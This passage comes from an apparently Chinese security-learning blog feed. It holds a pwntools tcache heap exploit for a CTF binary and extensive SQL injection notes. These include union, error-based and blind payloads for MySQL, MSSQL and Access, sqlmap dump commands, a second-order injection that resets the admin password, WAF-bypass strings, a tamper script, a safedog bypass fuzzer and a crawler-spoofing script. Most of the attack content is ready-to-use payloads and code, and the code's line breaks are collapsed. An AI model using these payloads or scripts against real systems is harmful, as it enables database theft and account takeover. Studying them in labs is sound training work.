src="https://s2.loli.net/2022/03/16/zPmtB4yuw15WZUF.png"></p><p>最后exp如下</p><hr><pre><code>#! /usr/bin/python3from pwn import *import timecontext.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;one = []elf = ELF(&#39;./cpp2&#39;)#io = remote(&#39;47.104.143.202&#39;,15348)#libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)io = process(&#39;./cpp2&#39;)libc = elf.libcr   =  lambda x : io.recv(x)rx  =  lambda x: io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)one = []def ad(idx,size): sla(&#39;&gt;&gt;&#39;,str(1)) sla(&#39;I:&gt;&gt;&#39;,str(idx)) sla(&#39;S:&gt;&gt;&#39;,str(size))def md(idx,con): sla(&#39;&gt;&gt;&#39;,str(2)) sla(&#39;I:&gt;&gt;&#39;,str(idx)) sla(&#39;V:&gt;&gt;&#39;,con)def rm(idx): sla(&#39;&gt;&gt;&#39;,str(4)) sla(&#39;I:&gt;&gt;&#39;,str(idx))def dp(idx): sla(&#39;&gt;&gt;&#39;,str(3)) sla(&#39;I:&gt;&gt;&#39;,str(idx))#-----------------------for i in range(2):   ad(i,0x67)ad(2,0x67)rm(0)rm(1)dp(1)ru(&#39;\n&#39;)heap = u64(rx(6).ljust(8,b&#39;\x00&#39;)) - 0x12EC0 + 0x10li(&quot;heap-----&gt;&quot;+hex(heap))md(1,p64(heap))ad(3,0x67)ad(4,0x67)md(4,b&#39;\x00&#39;*0x48+b&#39;\x00&#39;*6+b&#39;\x07&#39;)rm(3)rm(4)dp(4)base = u64(ru(b&#39;\x7f&#39;)[-5:] + b&#39;\x7f\x00\x00&#39;)base = base - 96 - 0x10 - libc.sym[&#39;__malloc_hook&#39;]li(&quot;base-----&gt;&quot;+hex(base))system = base + libc.sym[&#39;system&#39;]free = base + libc.sym[&#39;__free_hook&#39;]#bin_sh = bases + libc.search(b&#39;/bin/sh\x00&#39;)li(&quot;system-----&gt;&quot;+hex(system))li(&quot;free-----&gt;&quot;+hex(free))md(3,p64(free))ad(5,0x67)ad(6,0x67)md(5,b&#39;/bin/sh\x00&#39;)md(6,p64(system))rm(5)io.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;利用修改tcache的fd，从而使得tcache&lt;/p&gt;
&lt;p&gt;先看一下tcache的源代码：&lt;/p&gt;
&lt;p&gt;tcache_get()：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;static __always_inline void *
tcache_get (size_t tc_i</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Web学习 sql注入</title>
    <link href="http://example.com/2022/03/16/sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2022/03/16/sql%E6%B3%A8%E5%85%A5/</id>
    <published>2022-03-16T08:13:35.200Z</published>
    <updated>2022-04-08T16:48:13.629Z</updated>
    
    <content type="html"><![CDATA[<p>知识点:<br>在MYsQL5.o以上版本中,mysql存在一个自带数据库名为<br>information_schema，它是一个存储记录有所有数掘库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。</p><p><img src="https://s2.loli.net/2022/03/06/j2SEkoWpRh7VgfL.png"></p><p>information_schema.tables:     记录所有表名信息的表<br>information_schema.columns:    记录所有列名信息的表</p><p>table__name :表名<br>column_name:列名<br>table_schema:数据库名</p><p>group_concat(table_name)   查询所有的表名</p><p>猜解列名数量（字段数)<br>    order by x  (x 变动,查看网页是否正常)</p><pre><code>http://219.153.49.228:48354/new_list.php?id=1 order by 1</code></pre><p>报错猜解准备（查看可显示的字段）</p><pre><code>http://219.153.49.228:48354/new_list.php?id=-1 union select 1,2,3,4信息收集:数据库版本: version()数据库名字: database()数据库用户: user()操作系统:   @@version_compile_oshttp://219.153.49.228:48354/new_list.php?id=-1 union select 1,database(),3,version()</code></pre><hr><h1 id="高版本MYSQL利用information-schema库的注入"><a href="#高版本MYSQL利用information-schema库的注入" class="headerlink" title="高版本MYSQL利用information_schema库的注入"></a>高版本MYSQL利用information_schema库的注入</h1><p>必要知识点:<br>在MYSQL5.0以上版本中，mysql存在一个自带数据库名为<br>information_schema, 它是一个存储记录有所有数据库名，表名，列名的数据<br>库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。<br>低版本只能暴力猜解</p><p>数据库中符号”. “代表下一级，如xiao.user表示xiao数据库下的user表名</p><p>information_schema.tables    :记录所有表名信息的表<br>information_schema.columns   :记录所有列名信息的表</p><p>table__name :表名<br>column_name:列名<br>table_schema:数据库名</p><p>group_concat(table_name)   查询所有的表名</p><hr><p>查询指定数据库名mozhe_Discuz_stormGroup下的表名信息:</p><pre><code>http://219.153.49.228:48354/new_list.php?id=-1 union select1,group_concat (table_name),3,4 from information_schema.tables where table_schema=&#39;mozhe_Discuz_stormGroup&quot;</code></pre><p>查询指定表名stormGroup_member下的列名信息:</p><pre><code>http://219.153.49.228:48354/new_list.php?id=-1 union select1,group_concat (column_name),3,4 from information_schema.column where table_name=&#39;stormGroup_member&#39;</code></pre><p>查询指定数据信息:</p><pre><code>http://219.153.49.228:48354/new_list.php?id=-1 union select1,name , password,4 from stormGroup_membor</code></pre><p>猜解多个数据可以采用1imit x,1变动猜解</p><pre><code>http://219.153.49.228:48354/new_list.php?id=-1 union select1,name , password,4 from stormGroup_membor limit x,1  (x变动)</code></pre><hr><hr><p>高权限注入</p><p>获取所有数据库名:</p><pre><code>http://127.0.0.1:8080/sqlilabs/Less-2/?id=-1 union select 1,group_concat(schema_name) ,3 from information_schema.schemata</code></pre><p>获取指定qqyw数据库名下的表名信息:</p><pre><code>union select i, group_concat (table_name) , 3 from information_schema.tables where table_achema=&#39;qqyw&#39;</code></pre><p>获取指定qqyw下的表名admin下的列名信息:</p><pre><code>union select1,group_concat (column_name),3,4 from information_schema.column where table_name=&#39;admin&#39; and information_schema=&#39;qqyw&#39;</code></pre><p>获取指定qayw下的admin数据</p><pre><code>union select 1, u, p,4 from qqyw.admin</code></pre><h1 id="根据sql脚本的语法判断’’是否需要绕过"><a href="#根据sql脚本的语法判断’’是否需要绕过" class="headerlink" title="根据sql脚本的语法判断’’是否需要绕过"></a>根据sql脚本的语法判断’’是否需要绕过</h1><p>select *from user where id=’1’<br>select *from user where name=’xiaodi’<br>$name=$_GET[‘’];<br>$sql=”select * from user where name=’$name ‘ “;<br>?x=xiaodi and 1=1<br>select * from user where name=’xiaodi and 1=1’</p><hr><h1 id="SQL-server-MSSQL注入语句"><a href="#SQL-server-MSSQL注入语句" class="headerlink" title="SQL server / MSSQL注入语句"></a>SQL server / MSSQL注入语句</h1><p>1.判断数据库类型  </p><pre><code>and exists (select * from sysobjects)--返回正常为mssql（也名sql server）and exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个哈</code></pre><p>2.判断数据库类型</p><pre><code>and 1 = @@version-- 有回显时使用。and substring((select @@version),22,4)=&#39;2008&#39;-- 适用于无回显模式，后面的2008就是数据库版本,返回正常及是该版本，否则修改版本再尝试。</code></pre><p>3.获取数据库的个数</p><pre><code>1. and 1=(select quotename(count(name)) from master..sysdatabases)--2. and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) --3. and 1=(select str(count(name))%2b&#39;|&#39; from master..sysdatabases where dbid&gt;5) --        and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid&gt;5) --说明：dbid从1-4的数据库一般为系统数据库.</code></pre><p>5.获取数据库 （该语句是一次性获取全部数据库的，且语句只适合&gt;=2005，两条语句可供选择使用</p><pre><code>and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(&#39;&#39;))--and 1=(select &#39;|&#39;%2bname%2b&#39;|&#39; from master..sysdatabases FOR XML PATH(&#39;&#39;))--</code></pre><p>6.获取当前数据库  </p><pre><code>and db_name()&gt;0and 1=(select db_name())--</code></pre><p>7.获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于    mssql2005及以上版本）】</p><pre><code>and 1=(select quotename(name) from 数据库名..sysobjects where xtype=&#39;U&#39; FOR XML PATH(&#39;&#39;))-- and 1=(select &#39;|&#39;%2bname%2b&#39;|&#39; from 数据库名..sysobjects where xtype=&#39;U&#39;  FOR XML PATH(&#39;&#39;))--</code></pre><p>8.获得表里的列一次爆指定表的所有列（只限于mssql2005及以上版本）：</p><pre><code>and 1=(select quotename(name) from 数据库名..syscolumns where id =(select  id from 数据库名..sysobjects where name=&#39;指定表名&#39;) FOR XML PATH(&#39;&#39;))-- and 1=(select &#39;|&#39;%2bname%2b&#39;|&#39; from 数据库名..syscolumns where id =(select  id from 数据库名..sysobjects where name=&#39;指定表名&#39;) FOR XML PATH(&#39;&#39;))--</code></pre><p>9.获取指定数据库中的表的列的数据库</p><p>逐条爆指定表的所有字段的数据（只限于mssql2005及以上版本）：</p><pre><code>and 1=(select top 1 * from 指定数据库..指定表名 where排除条件 FOR XML PATH(&#39;&#39;))--</code></pre><p>一次性爆N条所有字段的数据（只限于mssql2005及以上版本）：</p><pre><code>and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(&#39;&#39;))--复制代码第一条语句：and  1=(select top 1 * from 指定数据库..指定表名 FOR XML  PATH(&#39;&#39;))--加上where条件筛选结果出来会更加好，如：where  and name like &#39;%user%&#39;  就会筛选出含有user关键词的出来。用在筛选表段时很不错。</code></pre><h1 id="PostgraSQL注入语句"><a href="#PostgraSQL注入语句" class="headerlink" title="PostgraSQL注入语句"></a>PostgraSQL注入语句</h1><p><a href="https://www.webshell.cc/524.html">https://www.webshell.cc/524.html</a></p><p><a href="https://www.cnblogs.com/yilishazi/p/14710349.html">https://www.cnblogs.com/yilishazi/p/14710349.html</a></p><p><a href="https://www.jianshu.com/p/ba0297da2c2e">https://www.jianshu.com/p/ba0297da2c2e</a></p><h1 id="Oracle注入语句"><a href="#Oracle注入语句" class="headerlink" title="Oracle注入语句"></a>Oracle注入语句</h1><p><a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">https://www.cnblogs.com/peterpan0707007/p/8242119.html</a></p><h1 id="MongoDB注入语句"><a href="#MongoDB注入语句" class="headerlink" title="MongoDB注入语句"></a>MongoDB注入语句</h1><p><a href="https://blog.csdn.net/weixin_33881753/article/details/87981552">https://blog.csdn.net/weixin_33881753/article/details/87981552</a></p><p><a href="https://www.secpulse.com/archives/3278.html">https://www.secpulse.com/archives/3278.html</a></p><p>#手工注入流程</p><p>高版本也可以利用information_schema库来注入（详细见上）</p><h2 id="MySQL："><a href="#MySQL：" class="headerlink" title="MySQL："></a>MySQL：</h2><pre><code>1.找到注入点 and 1=1 and 1=2 测试报错2.order by 5 # 到5的时候报错，获取字段总数为43.id=0(不是1就行，强行报错) union select 1,2,3,4 # 联合查询，2和3可以显示信息4.获取数据库信息user() ==&gt;rootdatabase() ==&gt;mozhe_Discuz_StormGroupversion() ==&gt;5.7.22-0ubuntu0.16.04.15.获取数据库表table_name 表名information_schema.tables 系统生成信息表table_schema=数据库名16进制或者用单引号括起来改变limit 0，1中前一个参数，得到两个表 StormGroup_member notice6.获取列名结果如下 id,name,password,status7.脱裤</code></pre><h2 id="Access："><a href="#Access：" class="headerlink" title="Access："></a>Access：</h2><p>由于access数据库结构不同，一般只能通过暴力猜解的方式注入</p><pre><code>1.and 1=2 报错找到注入点2.order by 获取总字段3.猜解表名 and exists (select * from admin) 页面返回正常，说明存在admin表4.猜解列名 and exists(select id from admin) 页面显示正常，admin表中存在id列 username,passwd 同样存在5.脱裤 union select 1,username,passwd,4 from admin</code></pre><h2 id="MSSQL："><a href="#MSSQL：" class="headerlink" title="MSSQL："></a>MSSQL：</h2><pre><code>1.and 1=2报错2.order by N# 获取总字段3.猜表名 and exists(select * from manage) 表名manage存在4.猜解列名 and exists(select id from manage) 列名id存在，同样username,password也存在5.脱裤 and exists (select id from manage where id=1 ) 证明id=1存在and exists (select id from manage where%20 len(username)=8 and id=1 ) 猜解username字段长度为8and exists (select id from manage where%20 len(password)=16 and id=1 ) 猜解password字段长度为16可用Burp的Intruder功能辅助猜解猜解username第1到8位的字符，ASCII转码 admin_mz猜解password第1到16位的字符，ASCII转码(Burp 爆破)转ASCII的py脚本：72e1bfc3f01b7583 MD5解密为97285101</code></pre><h1 id="SQL注入—报错盲注"><a href="#SQL注入—报错盲注" class="headerlink" title="SQL注入—报错盲注"></a>SQL注入—报错盲注</h1><p>基于布尔的SQL盲注-逻辑判断（优先级：2）<br>regexp,like,ascii,left,ord,mid</p><p>基于时间的SQL盲注-延时判断（优先级：3）<br>if,sleep</p><p>基于报错的SQL盲注-报错回显（优先级：1）<br>floor，updatexml，extractvalue</p><h2 id="基于报错的SQL盲注-报错回显"><a href="#基于报错的SQL盲注-报错回显" class="headerlink" title="基于报错的SQL盲注-报错回显"></a>基于报错的SQL盲注-报错回显</h2><p>floor<br>payload:<br>pikachu  insert</p><h3 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h3><p>username=x’ or(select 1 from(select count(*),concat((select(select (select  concat(0x7e,database(),0x7e))) from  information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or ‘<br>&amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei &amp;submit=submit</p><h3 id="updatexml-个人觉得是最方便的"><a href="#updatexml-个人觉得是最方便的" class="headerlink" title="updatexml (个人觉得是最方便的)"></a>updatexml (个人觉得是最方便的)</h3><p>username=x ‘ or updatexml(1,concat(0x7e,(version())),0) or ‘ &amp; password=xiaodi &amp;                 sex=%E7%94%B7 &amp; honenum=13878787788 &amp; email=wuhan &amp; add=hubei &amp; submit=submit</p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h3><p>username=x ‘ or extractvalue(1,concat(0x7e,database())),0) or ‘ </p><h2 id="基于时间的SQL盲注-延时判断"><a href="#基于时间的SQL盲注-延时判断" class="headerlink" title="基于时间的SQL盲注-延时判断"></a>基于时间的SQL盲注-延时判断</h2><p>and if(ascii(substr(database(),1,1))=115,sleep(5),1)–+</p><p>substr截取字符串的第一位，共一位字符，若其ascii码为115，则休眠5s</p><p>and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)–+</p><pre><code>select table_name from information_schema.tables where table_schema=database() limit 0,1查询information_schema.tables 表中数据库为当前数据库的，索引从0开始的,共一位的数据</code></pre><h2 id="基于布尔的SQL盲注-逻辑判断"><a href="#基于布尔的SQL盲注-逻辑判断" class="headerlink" title="基于布尔的SQL盲注-逻辑判断"></a>基于布尔的SQL盲注-逻辑判断</h2><p>页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据</p><p>当前数据库database（）的长度大于10，返回true页面，否则FALSE页面：</p><p><a href="http://127.0.0.1/Less-8/?id=1&#39;and">http://127.0.0.1/Less-8/?id=1&#39;and</a> (length(database()))&gt;10 –+</p><p>count(*)计数   concat()连接字符   floor()重复数据，返回0,1两个值  group by 进行分组 rand(0)避免数据重复造成的错误</p><p>猜当前数据库第一个字符</p><p><a href="http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1&#39;and">http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1&#39;and</a> ascii(substr(database(),1,1))&gt;114#</p><p>利用二分法，115为fal，114TRUE，数据库第一个字符ASCII为115，即s</p><h1 id="焯，使用sqlmap"><a href="#焯，使用sqlmap" class="headerlink" title="焯，使用sqlmap"></a>焯，使用sqlmap</h1><h2 id="爆出数据库版本"><a href="#爆出数据库版本" class="headerlink" title="爆出数据库版本"></a>爆出数据库版本</h2><p>sqlmap -u <a href="http://192.168.127.1:8080/sqli-labs/Less-8/?id=1">http://192.168.127.1:8080/sqli-labs/Less-8/?id=1</a> </p><p><img src="https://s2.loli.net/2022/03/01/OfUJD3qLcesRwbu.png"><br><img src="https://s2.loli.net/2022/03/01/SRLcVU1bFf2Jh8A.png"></p><h2 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h2><p>sqlmap -u <a href="http://192.168.127.1:8080/sqli-labs/Less-8/?id=1">http://192.168.127.1:8080/sqli-labs/Less-8/?id=1</a> -dbs</p><p><img src="https://s2.loli.net/2022/03/01/QCekclNzJTOVKs5.png"><br><img src="https://s2.loli.net/2022/03/01/NfGzwEdOvR5FkMW.png"></p><h2 id="爆当前数据库"><a href="#爆当前数据库" class="headerlink" title="爆当前数据库"></a>爆当前数据库</h2><p>sqlmap -u <a href="http://192.168.127.1:8080/sqli-labs/Less-8/?id=1">http://192.168.127.1:8080/sqli-labs/Less-8/?id=1</a> –current-db</p><p><img src="https://s2.loli.net/2022/03/01/L796beYEjtSvDNH.png"></p><h2 id="爆出security下的表名"><a href="#爆出security下的表名" class="headerlink" title="爆出security下的表名"></a>爆出security下的表名</h2><p>sqlmap -u <a href="http://192.168.127.1:8080/sqli-labs/Less-8/?id=1">http://192.168.127.1:8080/sqli-labs/Less-8/?id=1</a> -D security –tables</p><p><img src="https://s2.loli.net/2022/03/01/aFtXWoBU4xd1gr3.png"></p><h2 id="爆出security下users表的列名"><a href="#爆出security下users表的列名" class="headerlink" title="爆出security下users表的列名"></a>爆出security下users表的列名</h2><p>sqlmap -u <a href="http://192.168.127.1:8080/sqli-labs/Less-8/?id=1">http://192.168.127.1:8080/sqli-labs/Less-8/?id=1</a> -D security -T users –columns   </p><p><img src="https://s2.loli.net/2022/03/01/uja1UoKBnme2DtW.png"><br><img src="https://s2.loli.net/2022/03/01/qD1sw3NTgj4Khrk.png"></p><h2 id="爆出指定列下的数据"><a href="#爆出指定列下的数据" class="headerlink" title="爆出指定列下的数据"></a>爆出指定列下的数据</h2><p>sqlmap -u <a href="http://192.168.127.1:8080/sqli-labs/Less-8/?id=1">http://192.168.127.1:8080/sqli-labs/Less-8/?id=1</a> -D security -T users -C id,username,password –dump</p><p><img src="https://s2.loli.net/2022/03/01/pc6tR7XxKfkTzsv.png"><br><img src="https://s2.loli.net/2022/03/01/AV4SY9tfZHWwKJL.png"></p><h1 id="加解密注入，二次注入，DNSlog注入"><a href="#加解密注入，二次注入，DNSlog注入" class="headerlink" title="加解密注入，二次注入，DNSlog注入"></a>加解密注入，二次注入，DNSlog注入</h1><h2 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h2><p>get或post传输参数时可能采用了base64的加密方式将参数传输给服务器</p><p>比如<a href="http://www.xxx.com/index.php?id=MQ==">www.xxx.com/index.php?id=MQ==</a><br>加密部分：MQ==<br>解密结果：1 相当于id=1</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><ol><li>原理</li></ol><p>二次注入是存储型注入，可以理解为构造恶意数据存储在数据库后，恶意数据被读取并进入到了SQL查询语句所导致的注入。恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，</p><p>当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。详细点来讲，就是在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc </p><p>对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，</p><p>直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，</p><p>就形成了二次注入。二次注入无法通过扫描工具或者代码自己手工测试出来的，二次注入一般会产生在网站程序源代码才会发现的注入漏洞，从前端或者黑盒测试是看不到这个漏洞的。</p><ol start="2"><li>过程</li><li>第一步：插入恶意数据</li></ol><p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p><p>第二步：引用恶意数据</p><p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p><ol start="3"><li>过程原理图</li></ol><p><img src="https://s2.loli.net/2022/03/06/zPjwLygYqstWTbm.png"></p><ol start="4"><li>思路</li></ol><p>a. 黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。</p><p>b. 服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</p><p>c. 黑客向服务端发送第二个与第一次不相同的请求数据信息。</p><p>d. 服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。</p><p>e. 服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。</p><h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2><ol><li>原理<br>首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，</li></ol><p>这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了。DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，</p><p>来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息</p><ol start="2"><li><p>利用场景</p></li><li><p>在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，这时候就要用到我们的DNSlog注入。</p></li><li><p>推荐平台</p></li></ol><p>a. <a href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p><p>b. <a href="http://ceye.io/%EF%BC%88%E9%9C%80%E8%A6%81%E6%B3%A8%E5%86%8C%EF%BC%89">http://ceye.io/（需要注册）</a>    </p><p>c. <a href="http://admin.dnslog.link/">http://admin.dnslog.link</a></p><h2 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h2><pre><code>Sqlmap注入Base64编码的注入点：https://www.bbsmax.com/A/A2dmVVQBze/https://www.freebuf.com/column/184587.htmlhttps://www.cnblogs.com/renhaoblog/p/12912452.htmlhttps://www.pianshen.com/article/9561325277/https://github.com/bugscanteam/dnslog/(自己搭建dnslog服务器)</code></pre><h2 id="靶场演练"><a href="#靶场演练" class="headerlink" title="靶场演练"></a>靶场演练</h2><h3 id="cooke注入"><a href="#cooke注入" class="headerlink" title="cooke注入"></a>cooke注入</h3><p>先找出所有的库名</p><p>union select 1,2,group_concat(schema_name) from information_schema.schemata#</p><p><img src="https://s2.loli.net/2022/03/06/biKfB6y5zR7YxMs.png"><br><img src="https://s2.loli.net/2022/03/06/OnCseyB71EpkVJf.png"></p><p>再爆出security下的表名</p><p>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p><p>再爆出表下有什么字段</p><p>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+</p><p>查看users里面所有账户和密码<br>Cookie: uname= ’ union select 1,2,group_concat(concat_ws(’~’,username,password)) from security.users–+</p><h3 id="有加密的cooke注入"><a href="#有加密的cooke注入" class="headerlink" title="有加密的cooke注入"></a>有加密的cooke注入</h3><p><img src="https://s2.loli.net/2022/03/06/P74nvNzbSgs2jqD.png"><br><img src="https://s2.loli.net/2022/03/06/1PQUld8SVxB9ebj.png"></p><p>可发现uname处有base64加密</p><p>根据报错信息得知还需要在单引号后加上右括号</p><p>admin’) 然后进行编码，报错<br>admin’) #然后进行编码，回显正常<br>说明闭合方式为 ( ‘ ‘ )</p><p>注入Cookie uname=</p><p>1’) union select </p><p>MScpIHVuaW9uIHNlbGVjdCA=<br><img src="https://s2.loli.net/2022/03/06/eCLz2hfoD8RZ7Hs.png"></p><p>本题需要注意的是闭合方式为 ( ‘ ‘ ) 和 加密注入</p><h3 id="二次注入-1"><a href="#二次注入-1" class="headerlink" title="二次注入"></a>二次注入</h3><p>在任何界面进行注入应该都是无效的，因为操作失败时会跳转到其他页面，而没有任何例如错误的回显信息。此处考虑的就不是之前那些把敏感信息弄出来的注入了，而是考虑利用改密码操作夺取其他账号的控制权。此处我们考虑二次注入，首先我们构造一个特殊的用户，该用户的用户名为 “admin’#”，密码随便设</p><p>使用admin’#进行登录</p><p><img src="https://s2.loli.net/2022/03/06/WXGEpZQUNFj3mfH.png"></p><p>登录成功后，更改密码为123</p><p><img src="https://s2.loli.net/2022/03/06/vdAEMFxzSgWe7NK.png"></p><p>返回主界面使用账户：admin 密码：123登录</p><p>此时如果将这个用户作为过滤条件实现记录的修改，该用户名后面的 “’#” 不仅能闭合字段，也能把后面的内容注释掉。而且成功闭合后，我们实际上操作的用户名应该是 “admin”。修改密码成功之后，使用用户名 “admin” 和我们修改的密码进行登录，发现我们夺去了该用户的密码，登录成功</p><p>如果用户名是 “admin’#”，则 SQL 语句会变成这样。</p><pre><code>UPDATE users SET PASSWORD =&#39;$pass&#39; where username =&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; </code></pre><p>由于此时符号没有转义，因此该用户名的 “#” 在 SQL 语句中会当做是注释</p><pre><code>UPDATE users SET PASSWORD =&#39;$pass&#39; where username =&#39;admin&#39;#</code></pre><p>因此实现了修改admin的密码。</p><h3 id="DNS等注入"><a href="#DNS等注入" class="headerlink" title="DNS等注入"></a>DNS等注入</h3><p>暂时没成功</p><h1 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h1><p><img src="https://s2.loli.net/2022/03/07/G5ukCMqv6BQUHoE.png"></p><pre><code>数据库特性（补充）%23x%0aunion%23x%0Aselect%201,2,3    %20/*!44509union*/%23x%0aselect%201,2,3id=1/**&amp;id=-1%20union%20select%201,2,3%23*/%20union%20all%23%0a%20select%201,2,3%23</code></pre><p>分析下句<br>    %20union%20/<em>!44509select</em>/%201,2,3</p><p>在看下句<br>    /*!50001 select * from test */</p><p>数据库特性，当数据库版本高于5.00.01时才会执行</p><pre><code>/*!50001 select * from test */这样就真的注释掉，不会执行了</code></pre><h2 id="FUZZ绕过脚本"><a href="#FUZZ绕过脚本" class="headerlink" title="FUZZ绕过脚本"></a>FUZZ绕过脚本</h2><pre><code>#!/usr/bin/envpython&quot;&quot;&quot;Copyright(c)2006-2019sqlmapdevelopers(http://sqlmap.org/)Seethefile&#39;LICENSE&#39;forcopyingpermission&quot;&quot;&quot;import osfrom lib.core.common import singleTimeWarnMessagefrom lib.core.enums import DBMSfrom lib.core.enums import PRIORITY__priority__=PRIORITY.HIGHESTdef dependencies():    singleTimeWarnMessage(&quot;tamper script &#39;%s&#39; is only meant to be run against %s&quot;%(os.path.basename(__file__).split(&quot;.&quot;)[0],DBMS.MYSQL))def tamper(payload,**kwargs):#%23a%0aunion/*!44575select*/1,2,3    if payload:        payload=payload.replace(&quot;union&quot;,&quot;%23a%0aunion&quot;)        payload=payload.replace(&quot;select&quot;,&quot;/*!44575select*/&quot;)        payload=payload.replace(&quot;%20&quot;,&quot;%23a%0a&quot;)        payload=payload.replace(&quot;&quot;,&quot;%23a%0a&quot;)        payload=payload.replace(&quot;database()&quot;,&quot;database%23a%0a()&quot;)    return payloadimport requests,timeurl=&#39;http://127.0.0.1:8080/sqlilabs/Less-2/?id=-1&#39;union=&#39;union&#39;select=&#39;select&#39;num=&#39;1,2,3&#39;a=&#123;&#39;%0a&#39;,&#39;%23&#39;&#125;aa=&#123;&#39;x&#39;&#125;aaa=&#123;&#39;%0a&#39;,&#39;%23&#39;&#125;b=&#39;/*!&#39;c=&#39;*/&#39;def bypass():    for xiaodi in a:        for xiaodis in aa:            for xiaodiss in aaa:                for two in range(44500,44600):                    urls=url+xiaodi+xiaodis+xiaodiss+b+str(two)+union+c+xiaodi+xiaodis+xiaodiss+select+xiaodi+xiaodis+xiaodiss+num                    #urlss=url+xiaodi+xiaodis+xiaodiss+union+xiaodi+xiaodis+xiaodiss+b+str(two)+select+c+xiaodi+xiaodis+xiaodiss+num                    try:                        result=requests.get(urls).text                        len_r=len(result)                        if (result.find(&#39;safedog&#39;)==-1):                            #print(&#39;bypass url addreess：&#39;+urls+&#39;|&#39;+str(len_r))                             print(&#39;bypass url addreess：&#39;+urls+&#39;|&#39;+str(len_r))                        if len_r==715:                             fp = open(&#39;url.txt&#39;,&#39;a+&#39;)                             fp.write(urls+&#39;\n&#39;)                             fp.close()                    except Exception as err:                        print(&#39;connecting error&#39;)                        time.sleep(0.1)if__name__==&#39;__main__&#39;:    print(&#39;fuzz strat!&#39;)    bypass()</code></pre><h2 id="伪造成百度爬虫脚本"><a href="#伪造成百度爬虫脚本" class="headerlink" title="伪造成百度爬虫脚本"></a>伪造成百度爬虫脚本</h2><pre><code>import jsonimport requestsurl=&#39;http://192.168.0.103:8080/&#39;head=&#123;    &#39;User-Agent&#39;:&#39;Mozilla/5.0(compatible;Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)&#39;&#125;for data in open(&#39;PH1P.txt&#39;):    data=data.replace(&#39;\n&#39;,&#39;&#39;)    urls=url+data    code=requests.get(urls.headers=head).status_code    